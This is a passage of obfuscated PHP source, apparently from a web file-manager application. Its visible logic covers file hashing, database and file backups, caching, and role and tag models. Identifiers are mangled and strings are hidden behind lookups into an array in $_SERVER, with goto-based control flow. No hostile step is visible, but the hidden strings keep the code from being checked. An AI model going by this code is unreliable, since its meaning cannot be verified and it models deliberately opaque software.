$íæİ’ÂÊ[78] => $‚ÜØÅÃ“, $íæİ’ÂÊ[33] => $íæİ’ÂÊ[192], $íæİ’ÂÊ[80] => intval($Ö‡Ó¢à), $íæİ’ÂÊ[167] => get_path_ext($Ú§ªØ„é[$íæİ’ÂÊ[32]]), $íæİ’ÂÊ[1362] => $Ö‡Ó¢à > 0 && $Ú§ªØ„é[$íæİ’ÂÊ[1484]], $íæİ’ÂÊ[1363] => !1); return $ÀÕ÷Ãğ¹; } private function header($Ñî—ËÍ) { $ğì½õæ =& $_SERVER[¥Ÿ©ÒèÌ]; if (isset(self::$_cacheHeader[$Ñî—ËÍ])) { return self::$_cacheHeader[$Ñî—ËÍ]; } $Æ×Ïî¹ì = isset($GLOBALS[$ğì½õæ[1485]]) ? $GLOBALS[$ğì½õæ[1485]] : !1; $GLOBALS[$ğì½õæ[1485]] = !0; self::$_cacheHeader[$Ñî—ËÍ] = url_header($Ñî—ËÍ); $GLOBALS[$ğì½õæ[1485]] = $Æ×Ïî¹ì; return self::$_cacheHeader[$Ñî—ËÍ]; } public function hashSimple($“šŒŸË, $µ­á¯Å‹ = false) { $ò«÷éÃÏ =& $_SERVER[¥Ÿ©ÒèÌ]; $…Ç„öª = $this->info($“šŒŸË); if (!$…Ç„öª || !$…Ç„öª[$ò«÷éÃÏ[194]]) { return !1; } $İœ‚°ŸÉ = $…Ç„öª[$ò«÷éÃÏ[80]]; $ÚÜ¼¥Û‡ = 200; $’æˆ‘¬ù = 50; if ($İœ‚°ŸÉ <= $ÚÜ¼¥Û‡ * $’æˆ‘¬ù) { return md5($this->fileSubstr($“šŒŸË, 0, $İœ‚°ŸÉ)) . $İœ‚°ŸÉ; } $·¡¸²ï = intval($İœ‚°ŸÉ / $’æˆ‘¬ù); $åÂÒò = $ò«÷éÃÏ[12]; $¢ĞÒäË = timeFloat(); $–ÈîòÌ¿ = 15; for ($ä ÚÚ‹ì = 0; $ä ÚÚ‹ì < $’æˆ‘¬ù; $ä ÚÚ‹ì++) { if (timeFloat() - $¢ĞÒäË > $–ÈîòÌ¿) { return !1; } $ÚÓ¹àĞ‡ = $this->fileSubstr($“šŒŸË, $·¡¸²ï * $ä ÚÚ‹ì, $ÚÜ¼¥Û‡); if (!$ÚÓ¹àĞ‡) { return !1; } $åÂÒò .= $ÚÓ¹àĞ‡; } $åÂÒò .= $this->fileSubstr($“šŒŸË, $İœ‚°ŸÉ - $ÚÜ¼¥Û‡, $ÚÜ¼¥Û‡); return md5($åÂÒò) . $İœ‚°ŸÉ; } public function getContent($í±âÉ¬Ô) { return $this->fileSubstr($í±âÉ¬Ô); } public function fileSubstr($àö÷˜ëñ, $é‹Ì¾úÈ = 0, $ÛÓ¯àÃ› = -1) { $•…Çâà§ =& $_SERVER[¥Ÿ©ÒèÌ]; $¸¤«ÄŠ = $this->info($àö÷˜ëñ); if (!$¸¤«ÄŠ || !$¸¤«ÄŠ[$•…Çâà§[194]] && $¸¤«ÄŠ[$•…Çâà§[80]] > 1024 * 1024 * 10) { return !1; } if ($ÛÓ¯àÃ› === -1) { $ÛÓ¯àÃ› = $¸¤«ÄŠ[$•…Çâà§[80]]; } if ($ÛÓ¯àÃ› == 0) { return $•…Çâà§[12]; } $•×ÁìÌÏ = array($•…Çâà§[1486] . $é‹Ì¾úÈ . $•…Çâà§[772] . ($é‹Ì¾úÈ + $ÛÓ¯àÃ› - 1)); $™À­›±Ú = url_request($àö÷˜ëñ, $•…Çâà§[225], !1, $•×ÁìÌÏ, !1, !1, 1); return $™À­›±Ú[$•…Çâà§[1177]] ? $™À­›±Ú[$•…Çâà§[1177]] : $•…Çâà§[12]; } public function download($Ô¢àŠø, $ï•å¡şá) { Downloader::start($Ô¢àŠø, $ï•å¡şá); return $ï•å¡şá; } } goto Fß’Šä¡ÓÁ; a·ÍœÜ®¹å: class BackupDbFile { public function __construct() { } public function index() { $™¥¶»ÜĞ =& $_SERVER[¥Ÿ©ÒèÌ]; $ÏÒ’ôã× = Backup::get(); $®ô¸õ”¿ = $ÏÒ’ôã×[$™¥¶»ÜĞ[32]]; $šÜ¯ªèß = $this->tmpFilesPath() . "\x62\x61\143\153\x75\160\x5f{$®ô¸õ”¿}\57"; $Éñ†òæß = $this->backupPath($ÏÒ’ôã×); if (!($Éñ†òæß = IO::mkdir($Éñ†òæß))) { return !1; } $éÌŞ¼¾„ = IO::listPath($šÜ¯ªèß); $‘…íÄ× = isset($éÌŞ¼¾„[$™¥¶»ÜĞ[76]]) ? $éÌŞ¼¾„[$™¥¶»ÜĞ[76]] : array(); $Ó¹ŸÉì« = array_sum(array_column($‘…íÄ×, $™¥¶»ÜĞ[80])); if (!$Ó¹ŸÉì«) { return !1; } $§ÀÇ¡ = array($™¥¶»ÜĞ[788] => $Ó¹ŸÉì«, $™¥¶»ÜĞ[789] => time()); Backup::set($§ÀÇ¡); $Ğİ¹ä’è = new TaskFileTransfer($™¥¶»ÜĞ[790], $™¥¶»ÜĞ[770], count($‘…íÄ×), LNG($™¥¶»ÜĞ[771]) . $™¥¶»ÜĞ[460] . LNG($™¥¶»ÜĞ[773]) . $™¥¶»ÜĞ[791]); $Ğİ¹ä’è->task[$™¥¶»ÜĞ[753]] = $Ó¹ŸÉì«; foreach ($éÌŞ¼¾„[$™¥¶»ÜĞ[76]] as $¸ƒ«Ô¶ˆ) { $æ–”›ÜÌ = IO::move($¸ƒ«Ô¶ˆ[$™¥¶»ÜĞ[78]], $Éñ†òæß); if (!$æ–”›ÜÌ) { $Ğİ¹ä’è->end(); $İïÎËˆØ = IO::getLastError($™¥¶»ÜĞ[792] . $¸ƒ«Ô¶ˆ[$™¥¶»ÜĞ[78]] . $™¥¶»ÜĞ[793] . $Éñ†òæß . $™¥¶»ÜĞ[536]); write_log($İïÎËˆØ, $™¥¶»ÜĞ[770]); return !1; } } $¶€’«¬ = new DbManage(); $©ûŠ˜ÛÈ = $¶€’«¬->getSqlFile(); if (!$©ûŠ˜ÛÈ[$™¥¶»ÜĞ[794]] || !$©ûŠ˜ÛÈ[$™¥¶»ÜĞ[13]]) { return !1; } IO::move($©ûŠ˜ÛÈ[$™¥¶»ÜĞ[794]], $Éñ†òæß); IO::move($©ûŠ˜ÛÈ[$™¥¶»ÜĞ[13]], $Éñ†òæß); $Ğİ¹ä’è->end(); $§ÀÇ¡ = array($™¥¶»ÜĞ[795] => $Ó¹ŸÉì«, $™¥¶»ÜĞ[796] => time()); Backup::set($§ÀÇ¡); return !0; } private function backupPath($àÇá®à¢) { $‰Ç™÷– =& $_SERVER[¥Ÿ©ÒèÌ]; $ç›Ğ‰” = $àÇá®à¢[$‰Ç™÷–[32]]; $‚ĞúâÅÚ = Model($‰Ç™÷–[760])->get($‰Ç™÷–[761]); $ÔÔ„Æˆü = substr(md5($‰Ç™÷–[762] . $‚ĞúâÅÚ . $ç›Ğ‰”), 0, 8); return "\x7b\151\x6f\x3a{$àÇá®à¢[$‰Ç™÷–[742]]}\x7d\x2f\x64\x61\164\x61\142\x61\163\145\x2f\142\x61\x63\x6b\x75\x70\x2f" . $ç›Ğ‰” . $‰Ç™÷–[11] . $ÔÔ„Æˆü; } private function tmpFilesPath() { $‚”‰ì±± =& $_SERVER[¥Ÿ©ÒèÌ]; $ºªÅ«ë© = TEMP_FILES; if ($GLOBALS[$‚”‰ì±±[6]][$‚”‰ì±±[90]][$‚”‰ì±±[786]]) { $ºªÅ«ë© = $GLOBALS[$‚”‰ì±±[6]][$‚”‰ì±±[90]][$‚”‰ì±±[786]]; if (!mk_dir($ºªÅ«ë©) || !is_writable($ºªÅ«ë©) || !IO::mkfile($ºªÅ«ë© . $‚”‰ì±±[787])) { $ºªÅ«ë© = TEMP_FILES; } } return $ºªÅ«ë©; } } class BackupFile { public function __construct() { } public function index() { $½‹ğ‹ãæ = Backup::get(); $è÷ÖÛ“ = $½‹ğ‹ãæ[$_SERVER[¥Ÿ©ÒèÌ][297]][$_SERVER[¥Ÿ©ÒèÌ][192]][$_SERVER[¥Ÿ©ÒèÌ][467]]; $Âôê·š = array($_SERVER[¥Ÿ©ÒèÌ][468] => array($_SERVER[¥Ÿ©ÒèÌ][797], $è÷ÖÛ“), $_SERVER[¥Ÿ©ÒèÌ][798] => array($_SERVER[¥Ÿ©ÒèÌ][335], $½‹ğ‹ãæ[$_SERVER[¥Ÿ©ÒèÌ][742]])); $öôçˆµÛ = (int) Model($_SERVER[¥Ÿ©ÒèÌ][779])->where($Âôê·š)->count($_SERVER[¥Ÿ©ÒèÌ][467]); $—ç´£µÁ = (int) Model($_SERVER[¥Ÿ©ÒèÌ][779])->where($Âôê·š)->sum($_SERVER[¥Ÿ©ÒèÌ][80]); $‰ÏğìÍ¡ = new TaskFileTransfer($_SERVER[¥Ÿ©ÒèÌ][799], $_SERVER[¥Ÿ©ÒèÌ][770], $öôçˆµÛ, LNG($_SERVER[¥Ÿ©ÒèÌ][771]) . $_SERVER[¥Ÿ©ÒèÌ][772] . LNG($_SERVER[¥Ÿ©ÒèÌ][800])); $‰ÏğìÍ¡->task[$_SERVER[¥Ÿ©ÒèÌ][753]] = $—ç´£µÁ; $°Úª°îÆ = array($_SERVER[¥Ÿ©ÒèÌ][801] => $öôçˆµÛ, $_SERVER[¥Ÿ©ÒèÌ][802] => $—ç´£µÁ, $_SERVER[¥Ÿ©ÒèÌ][803] => time()); Backup::set($°Úª°îÆ); $æ‹Ü˜€£ = !0; $»ã²·Íñ = $this->storeIds(); $çíšÉË = 1; $å©¯Äƒã = 1000; $Ûãà˜ = $ëÍ®’Ü = 0; $×˜ÉÊ¡¢ = array(); $âğéç¡ˆ = $”éÖ½ËÑ = 0; do { $£•êåÑ = $_SERVER[¥Ÿ©ÒèÌ][804]; $ÉÄÃµ³É = Model($_SERVER[¥Ÿ©ÒèÌ][779])->where($Âôê·š)->field($£•êåÑ)->order($_SERVER[¥Ÿ©ÒèÌ][805])->selectPage($å©¯Äƒã, $çíšÉË); $ÕĞØóÆŒ = !empty($ÉÄÃµ³É[$_SERVER[¥Ÿ©ÒèÌ][373]]) ? $ÉÄÃµ³É[$_SERVER[¥Ÿ©ÒèÌ][373]] : array(); foreach ($ÕĞØóÆŒ as $²åÅ£¢å) { if (!$this->_fileExist($²åÅ£¢å, $×˜ÉÊ¡¢, $»ã²·Íñ)) { $öôçˆµÛ -= 1; $—ç´£µÁ -= (int) $²åÅ£¢å[$_SERVER[¥Ÿ©ÒèÌ][80]]; write_log("\x66\151\x6c\145\40\x6e\157\164\40\145\170\x69\x73\164\x2e\x66\151\154\145\111\x44\x3a{$²åÅ£¢å[$_SERVER[¥Ÿ©ÒèÌ][467]]}\x2c\40\160\141\164\x68\x3a{$²åÅ£¢å[$_SERVER[¥Ÿ©ÒèÌ][78]]}", $_SERVER[¥Ÿ©ÒèÌ][806]); continue; } $éî‘×µü = $²åÅ£¢å[$_SERVER[¥Ÿ©ÒèÌ][78]]; $¯‘çç¡Ø = "\173\x69\157\x3a{$½‹ğ‹ãæ[$_SERVER[¥Ÿ©ÒèÌ][742]]}\175" . substr($éî‘×µü, strlen("\x7b\x69\x6f\x3a{$²åÅ£¢å[$_SERVER[¥Ÿ©ÒèÌ][807]]}\x7d")); if (IO::exist($¯‘çç¡Ø)) { $‰ÏğìÍ¡->updateFileEnd($²åÅ£¢å[$_SERVER[¥Ÿ©ÒèÌ][32]], $²åÅ£¢å[$_SERVER[¥Ÿ©ÒèÌ][80]]); } else { $¯‘çç¡Ø = get_path_father($¯‘çç¡Ø); IO::mkdir($¯‘çç¡Ø); if (!IO::copy($éî‘×µü, $¯‘çç¡Ø, $_SERVER[¥Ÿ©ÒèÌ][808])) { write_log($_SERVER[¥Ÿ©ÒèÌ][809] . $éî‘×µü . $_SERVER[¥Ÿ©ÒèÌ][793] . $¯‘çç¡Ø . $_SERVER[¥Ÿ©ÒèÌ][536], $_SERVER[¥Ÿ©ÒèÌ][770]); $æ‹Ü˜€£ = !1; break; } } $è÷ÖÛ“ = $²åÅ£¢å[$_SERVER[¥Ÿ©ÒèÌ][467]]; $ëÍ®’Ü += 1; $Ûãà˜ += $²åÅ£¢å[$_SERVER[¥Ÿ©ÒèÌ][80]]; $”éÖ½ËÑ += 1; $âğéç¡ˆ += $²åÅ£¢å[$_SERVER[¥Ÿ©ÒèÌ][80]]; if ($Ûãà˜ >= 1024 * 1024 * 100) { $°Úª°îÆ = array($_SERVER[¥Ÿ©ÒèÌ][810] => $è÷ÖÛ“, $_SERVER[¥Ÿ©ÒèÌ][811] => $”éÖ½ËÑ, $_SERVER[¥Ÿ©ÒèÌ][812] => $âğéç¡ˆ); Backup::set($°Úª°îÆ); $Ûãà˜ = $ëÍ®’Ü = 0; } } $²›ı•» = count($ÕĞØóÆŒ); $çíšÉË++; } while ($²›ı•» == $å©¯Äƒã); $‰ÏğìÍ¡->end(); $°Úª°îÆ = array($_SERVER[¥Ÿ©ÒèÌ][813] => 1, $_SERVER[¥Ÿ©ÒèÌ][496] => time(), $_SERVER[¥Ÿ©ÒèÌ][765] => 1, $_SERVER[¥Ÿ©ÒèÌ][810] => $è÷ÖÛ“, $_SERVER[¥Ÿ©ÒèÌ][802] => $—ç´£µÁ, $_SERVER[¥Ÿ©ÒèÌ][801] => $öôçˆµÛ, $_SERVER[¥Ÿ©ÒèÌ][814] => time()); if ($ëÍ®’Ü) { $°Úª°îÆ[$_SERVER[¥Ÿ©ÒèÌ][811]] = $”éÖ½ËÑ; $°Úª°îÆ[$_SERVER[¥Ÿ©ÒèÌ][812]] = $âğéç¡ˆ; } Backup::set($°Úª°îÆ); $this->_fileFilter($×˜ÉÊ¡¢); return !0; } private function _fileExist($Ö¯Ò™Ò¤, &$¯È¼ˆÑ, $ßıÌ´¸Ú) { $÷‘¢³ØÂ =& $_SERVER[¥Ÿ©ÒèÌ]; $ÒÙšÑä§ = $Ö¯Ò™Ò¤[$÷‘¢³ØÂ[78]]; if (in_array($Ö¯Ò™Ò¤[$÷‘¢³ØÂ[467]], $¯È¼ˆÑ)) { return !1; } if (!in_array($Ö¯Ò™Ò¤[$÷‘¢³ØÂ[807]], $ßıÌ´¸Ú)) { return !1; } if (IO::exist($ÒÙšÑä§)) { return !0; } $–ÆƒÑ¦Á = get_path_father($ÒÙšÑä§); if (IO::exist($–ÆƒÑ¦Á)) { $¯È¼ˆÑ[] = $Ö¯Ò™Ò¤[$÷‘¢³ØÂ[467]]; return !1; } $î­Ü“¾¹ = array($÷‘¢³ØÂ[807] => $Ö¯Ò™Ò¤[$÷‘¢³ØÂ[807]], $÷‘¢³ØÂ[78] => array($÷‘¢³ØÂ[387], "{$–ÆƒÑ¦Á}\45")); $å®íîÜá = Model($÷‘¢³ØÂ[779])->where($î­Ü“¾¹)->field($÷‘¢³ØÂ[468])->select(); $¯È¼ˆÑ = array_merge($¯È¼ˆÑ, array_to_keyvalue($å®íîÜá, $÷‘¢³ØÂ[12], $÷‘¢³ØÂ[467])); return !1; } private function _fileFilter($Åò¿ï£¥) { $éî•Æå± =& $_SERVER[¥Ÿ©ÒèÌ]; if (empty($Åò¿ï£¥)) { return; } $­¡ò™˜Ñ = array($éî•Æå±[467] => array($éî•Æå±[7], array_unique($Åò¿ï£¥))); $à¥”ó­Š = Model($éî•Æå±[815])->where($­¡ò™˜Ñ)->field($éî•Æå±[403])->select(); foreach ($à¥”ó­Š as $á¸¦ñ¿Œ) { Model($éî•Æå±[815])->remove($á¸¦ñ¿Œ[$éî•Æå±[403]], !1); } } private function storeIds() { $æ–•Ëî¨ =& $_SERVER[¥Ÿ©ÒèÌ]; $Óêéãˆ = Model($æ–•Ëî¨[757])->listData(); $‘ºìÛ— = array(); $…Èàù’½ = $GLOBALS[$æ–•Ëî¨[6]][$æ–•Ëî¨[90]][$æ–•Ëî¨[816]]; foreach ($Óêéãˆ as $–¨Ãˆ¨) { $Õçå¡ô’ = strtolower($–¨Ãˆ¨[$æ–•Ëî¨[96]]); if (!isset($…Èàù’½[$Õçå¡ô’])) { continue; } $§½û†Ÿø = $æ–•Ëî¨[74] . (isset($…Èàù’½[$Õçå¡ô’]) ? $…Èàù’½[$Õçå¡ô’] : ucfirst($Õçå¡ô’)); if (!class_exists($§½û†Ÿø)) { continue; } $‘ºìÛ—[] = $–¨Ãˆ¨[$æ–•Ëî¨[401]]; } return $‘ºìÛ—; } } class Cache { protected static $handle; protected static $memoryCache; public static function init() { $Ö›ê—ÃÁ =& $_SERVER[¥Ÿ©ÒèÌ]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); $Š¹Â†ºˆ = $GLOBALS[$Ö›ê—ÃÁ[6]][$Ö›ê—ÃÁ[353]]; $¦’àì²š = $Š¹Â†ºˆ[$Š¹Â†ºˆ[$Ö›ê—ÃÁ[817]]]; $âŠ¸‡›” = $Š¹Â†ºˆ[$Ö›ê—ÃÁ[818]]; switch ($Š¹Â†ºˆ[$Ö›ê—ÃÁ[817]]) { case $Ö›ê—ÃÁ[21]: self::$handle = Model($Ö›ê—ÃÁ[819]); break; case $Ö›ê—ÃÁ[820]: self::$handle = new CacheRedis($¦’àì²š, $âŠ¸‡›”); break; case $Ö›ê—ÃÁ[821]: self::$handle = new CacheMemcached($¦’àì²š, $âŠ¸‡›”); break; case $Ö›ê—ÃÁ[192]: self::$handle = new CacheFile($¦’àì²š, $âŠ¸‡›”); break; default: break; } return self::$handle; } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($ˆø¤şê®) { if (is_array($ˆø¤şê®) || is_object($ˆø¤şê®)) { $ˆø¤şê® = json_encode($ˆø¤şê®); } $ˆø¤şê® = rawurlencode($ˆø¤şê®); return md5(KOD_SITE_ID . $_SERVER[¥Ÿ©ÒèÌ][11] . $ˆø¤şê®); } public static function get($Ì›¦†¤é, $‡ÏºéÛ = false) { $Í‚ääÇ = self::key($Ì›¦†¤é); if ($‡ÏºéÛ) { return unserialize(self::init()->get($Í‚ääÇ)); } if (!isset(self::$memoryCache[$Í‚ääÇ])) { $ÄÈ“ùÍÇ = self::init()->get($Í‚ääÇ); self::$memoryCache[$Í‚ääÇ] = unserialize($ÄÈ“ùÍÇ); } return self::$memoryCache[$Í‚ääÇ]; } public static function set($µ­³­´â, $ÕæÌ¦½—, $œ±ı• = false) { $Ä·è¹•Â = self::key($µ­³­´â); if (isset(self::$memoryCache[$Ä·è¹•Â]) && self::$memoryCache[$Ä·è¹•Â] === $ÕæÌ¦½—) { return !0; } if ($œ±ı• === 0) { self::$memoryCache[$Ä·è¹•Â] = $ÕæÌ¦½—; return !0; } CacheLock::lock($µ­³­´â); $±îû’Şî = self::init()->set($Ä·è¹•Â, serialize($ÕæÌ¦½—), $œ±ı•); self::$memoryCache[$Ä·è¹•Â] = $ÕæÌ¦½—; CacheLock::unlock($µ­³­´â); return $±îû’Şî; } public static function getCall($Õ˜»ùº×, $Ò¿·Ñ¡¸, $²öŒˆ®õ, $¤Œ€›üí = array()) { $Ü¢±Ô­Û =& $_SERVER[¥Ÿ©ÒèÌ]; $”Û©»¸ = self::get($Õ˜»ùº×); if ($”Û©»¸ || $”Û©»¸ === $Ü¢±Ô­Û[12]) { return $”Û©»¸; } $”Û©»¸ = call_user_func_array($²öŒˆ®õ, $¤Œ€›üí); $”Û©»¸ = $”Û©»¸ ? $”Û©»¸ : $Ü¢±Ô­Û[12]; self::set($Õ˜»ùº×, $”Û©»¸, $Ò¿·Ñ¡¸); return $”Û©»¸; } public static function remove($å¤˜ã¸ñ) { $âš·¦§¢ = self::key($å¤˜ã¸ñ); unset(self::$memoryCache[$âš·¦§¢]); self::clearTimeout(); CacheLock::lock($å¤˜ã¸ñ); $»º¶áñÁ = self::init()->remove($âš·¦§¢); CacheLock::unlock($å¤˜ã¸ñ); return $»º¶áñÁ; } public static function removeMemory($®£À´†) { $çÖ¿Æ¦‰ = self::key($®£À´†); unset(self::$memoryCache[$çÖ¿Æ¦‰]); } public static function clearMemory($ùàÈ¬¢¡ = false) { if ($ùàÈ¬¢¡) { $ùàÈ¬¢¡ = self::key($ùàÈ¬¢¡); unset(self::$memoryCache[$ùàÈ¬¢¡]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[¥Ÿ©ÒèÌ][822])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[¥Ÿ©ÒèÌ][823])) { self::init()->clearTimeout(); } } } goto c×Œ½­Æéİ; C¢ÅŠÛ«¥•: class SystemOptionModel extends ModelBaseOption { protected $tableName = "\163\171\163\164\145\x6d\137\x6f\x70\164\x69\157\156"; protected $jsonField = array("\155\145\156\x75", "\x72\x6f\x6c\x65", "\x72\x6f\154\x65\107\x72\157\x75\160", "\x72\x65\147\151\x73\x74", "\145\155\141\151\154"); function __construct() { parent::__construct(); } protected function cacheKey($ÍöÛÅãÕ) { return "\x53\171\x73\x74\x65\155\117\160\x74\x69\157\156\137{$ÍöÛÅãÕ}"; } protected function optionDefault($ŠˆË–ì = '') { $ˆ§Æ§¢¼ =& $_SERVER[¥Ÿ©ÒèÌ]; if ($ŠˆË–ì == $ˆ§Æ§¢¼[12]) { return $GLOBALS[$ˆ§Æ§¢¼[6]][$ˆ§Æ§¢¼[385]]; } } } class SystemRecordModel extends ModelBaseLight { } class SystemRoleModel extends ModelBaseLight { public $optionType = "\123\x79\x73\x74\145\x6d\x2e\x72\157\154\145\x4c\x69\x73\164"; public $field = array("\156\x61\x6d\x65", "\141\165\164\x68", "\154\x61\x62\145\x6c", "\144\151\x73\x70\x6c\x61\x79", "\x73\x79\x73\164\145\155", "\x64\145\x73\143", "\x69\x67\x6e\157\x72\x65\x45\x78\164", "\x69\x67\x6e\157\162\x65\x46\x69\x6c\x65\123\151\x7a\x65", "\141\x64\x6d\151\x6e\x69\163\x74\162\x61\164\157\162", "\x73\x6f\x72\x74"); public function listData($Õ¡ê˜ÚÕ = false, $Î»ûù°ñ = "\163\157\x72\x74", $¦ÃæÕ¼Î = false) { $¸×‹ÂƒÔ =& $_SERVER[¥Ÿ©ÒèÌ]; $„ûŠäœ = parent::listData($Õ¡ê˜ÚÕ, $Î»ûù°ñ, $¦ÃæÕ¼Î); if (!$Õ¡ê˜ÚÕ) { foreach ($„ûŠäœ as $ĞÑº¤»Ó => $É¦„Í‚±) { if ($É¦„Í‚±[$¸×‹ÂƒÔ[2000]] == 1) { $„ûŠäœ[$ĞÑº¤»Ó][$¸×‹ÂƒÔ[451]] = LNG($¸×‹ÂƒÔ[2227]); } } } return $„ûŠäœ; } public function update($òøÂîÓ, $†ó—­ôŒ) { $³äÎéŸ =& $_SERVER[¥Ÿ©ÒèÌ]; $½©õƒ = parent::listData($òøÂîÓ); $ö·Õ¶§ù = $this->findByName($†ó—­ôŒ[$³äÎéŸ[32]]); if (!$½©õƒ || $ö·Õ¶§ù && $ö·Õ¶§ù[$³äÎéŸ[401]] != $½©õƒ[$³äÎéŸ[401]]) { return !1; } if ($ö·Õ¶§ù[$³äÎéŸ[2000]] == 1) { $†ó—­ôŒ = array($³äÎéŸ[32] => $†ó—­ôŒ[$³äÎéŸ[32]], $³äÎéŸ[1829] => $†ó—­ôŒ[$³äÎéŸ[1829]]); } $this->filterAuth($†ó—­ôŒ[$³äÎéŸ[414]]); return parent::update($òøÂîÓ, $†ó—­ôŒ); } public function remove($†×—ãà”) { $ üÀó­× = parent::listData($†×—ãà”); if (!$ üÀó­× || $ üÀó­×[$_SERVER[¥Ÿ©ÒèÌ][1260]]) { return !1; } return parent::remove($†×—ãà”); } public function add($¢Øû˜†Š) { $¶Ÿ×ÃÇ† =& $_SERVER[¥Ÿ©ÒèÌ]; $«ÃÉìãÙ = $¢Øû˜†Š[$¶Ÿ×ÃÇ†[32]]; if ($this->findByName($«ÃÉìãÙ)) { return !1; } $öä³Ä´« = array($¶Ÿ×ÃÇ†[421] => $«ÃÉìãÙ, $¶Ÿ×ÃÇ†[1813] => $¶Ÿ×ÃÇ†[12], $¶Ÿ×ÃÇ†[1809] => $¶Ÿ×ÃÇ†[1817], $¶Ÿ×ÃÇ†[2228] => 1, $¶Ÿ×ÃÇ†[1812] => 0, $¶Ÿ×ÃÇ†[2229] => 0, $¶Ÿ×ÃÇ†[1811] => $this->getSort()); $¢Øû˜†Š = array_merge($öä³Ä´«, $¢Øû˜†Š); $this->filterAuth($¢Øû˜†Š[$¶Ÿ×ÃÇ†[414]]); return parent::insert($¢Øû˜†Š); } private function getSort() { $ìøôÀ— =& $_SERVER[¥Ÿ©ÒèÌ]; $Ì·°Ô±± = parent::listData(); $¯¹²óº = array_to_keyvalue($Ì·°Ô±±, $ìøôÀ—[12], $ìøôÀ—[1830]); return empty($¯¹²óº) ? 0 : max($¯¹²óº) + 1; } private function filterAuth(&$øÛÕÕè‘) { $ğş¥š‚“ =& $_SERVER[¥Ÿ©ÒèÌ]; $ƒØÇ›Šã = array(); $ºíı’é¥ = array_filter(explode($ğş¥š‚“[50], $øÛÕÕè‘)); foreach ($ºíı’é¥ as $øÛÕÕè‘) { $æö¾ŸÑÖ = explode($ğş¥š‚“[10], $øÛÕÕè‘); if ($æö¾ŸÑÖ[0] == $ğş¥š‚“[2230] && $æö¾ŸÑÖ[1] != $ğş¥š‚“[1179]) { $İìÅÖÃ™ = $æö¾ŸÑÖ[0] . $ğş¥š‚“[10] . $æö¾ŸÑÖ[1] . $ğş¥š‚“[2231]; if (!in_array($İìÅÖÃ™, $ºíı’é¥)) { $ƒØÇ›Šã[] = $İìÅÖÃ™; } } $ƒØÇ›Šã[] = $øÛÕÕè‘; } $øÛÕÕè‘ = implode($ğş¥š‚“[50], $ƒØÇ›Šã); } public function sort($ö˜ÛŒ‡‡, $‘ÜÀÛÂ) { return parent::update($ö˜ÛŒ‡‡, $‘ÜÀÛÂ); } } goto Céøõ¡…«á; bÖÀ›¾ˆ•: class GroupTagModel extends ModelBase { protected $tableName = "\165\163\145\x72\x5f\146\x61\x76"; protected function cacheFunctionAlias($Âä¦Î½) { $î˜çı¶É =& $_SERVER[¥Ÿ©ÒèÌ]; return array($î˜çı¶É[1913] => array($Âä¦Î½[0], $î˜çı¶É[1914]), $î˜çı¶É[1915] => array($Âä¦Î½[0], $î˜çı¶É[1916])); } protected function get($òáç¶îŠ) { $’²ƒî² =& $_SERVER[¥Ÿ©ÒèÌ]; $ĞÛæ°à = Model($’²ƒî²[522])->metaGet($òáç¶îŠ, $’²ƒî²[1917]); $Â·ö“Õé = json_decode($ĞÛæ°à, !0); return $Â·ö“Õé ? $Â·ö“Õé : array($’²ƒî²[1918] => $’²ƒî²[89], $’²ƒî²[373] => array()); } protected function set($îˆ¼ùı, $œÀİñèç) { $º¸„©Ú =& $_SERVER[¥Ÿ©ÒèÌ]; $œÀİñèç = $œÀİñèç ? $œÀİñèç : array($º¸„©Ú[1918] => $º¸„©Ú[89], $º¸„©Ú[373] => array()); Model($º¸„©Ú[522])->metaSet($îˆ¼ùı, $º¸„©Ú[1917], json_encode($œÀİñèç)); return Model($º¸„©Ú[522])->metaSet($îˆ¼ùı, $º¸„©Ú[1917], json_encode($œÀİñèç)); } protected function getByTagID($º°¹¶…¦, $â³è¥ş) { $Ë¢¤Ì‘Ú =& $_SERVER[¥Ÿ©ÒèÌ]; if (!$º°¹¶…¦ || !$â³è¥ş) { return !1; } if (!Model($Ë¢¤Ì‘Ú[522])->getInfoSimple($º°¹¶…¦)) { return !1; } $€Â‡‡• = $this->get($º°¹¶…¦); if (!$€Â‡‡• || !isset($€Â‡‡•[$Ë¢¤Ì‘Ú[373]])) { return !1; } $³öåàÊ¶ = array_find_by_field($€Â‡‡•[$Ë¢¤Ì‘Ú[373]], $Ë¢¤Ì‘Ú[401], $â³è¥ş); return is_array($³öåàÊ¶) ? $³öåàÊ¶ : !1; } public function listSource($÷¨ş‰²—, $  Ö–¼İ) { $ãüÒË®ş =& $_SERVER[¥Ÿ©ÒèÌ]; if ($  Ö–¼İ && !is_array($  Ö–¼İ)) { $  Ö–¼İ = array($  Ö–¼İ); } $ûÖğ®œ§ = $this->listData($÷¨ş‰²—); $æ™­É¶ = array(); foreach ($ûÖğ®œ§ as $¥Ö¾ÍÀÂ) { $Ÿ­ó©¬ = $¥Ö¾ÍÀÂ[$ãüÒË®ş[78]]; if (!$Ÿ­ó©¬) { continue; } if (!isset($æ™­É¶[$Ÿ­ó©¬])) { $æ™­É¶[$Ÿ­ó©¬] = array(); } $æ™­É¶[$Ÿ­ó©¬][] = $¥Ö¾ÍÀÂ[$ãüÒË®ş[427]]; } $¾œ®½¬ù = array(); foreach ($æ™­É¶ as $½ÍÜÛáü => $Â…œ—»Î) { $Õ“™É¢ = !0; if (!$  Ö–¼İ) { $¾œ®½¬ù[] = $½ÍÜÛáü; continue; } foreach ($  Ö–¼İ as $Ì‰Í…÷) { if (!in_array($Ì‰Í…÷, $Â…œ—»Î)) { $Õ“™É¢ = !1; break; } } if ($Õ“™É¢) { $¾œ®½¬ù[] = $½ÍÜÛáü; } } if (!$¾œ®½¬ù) { return array(); } $©¬¶Ü”û = array($ãüÒË®ş[418] => array($ãüÒË®ş[419], $¾œ®½¬ù), $ãüÒË®ş[504] => $÷¨ş‰²—, $ãüÒË®ş[412] => SourceModel::TYPE_GROUP); $œ»«¨§ = Model($ãüÒË®ş[1311])->listSource($©¬¶Ü”û); if (!$œ»«¨§ || count($¾œ®½¬ù) == $œ»«¨§[$ãüÒË®ş[370]][$ãüÒË®ş[371]]) { return $œ»«¨§; } $¤Äâ¶¸ = array(); $Ô¨Ôê²Í = array_to_keyvalue($œ»«¨§[$ãüÒË®ş[77]], $ãüÒË®ş[12], $ãüÒË®ş[403]); $ÖÅŞÕÀ = 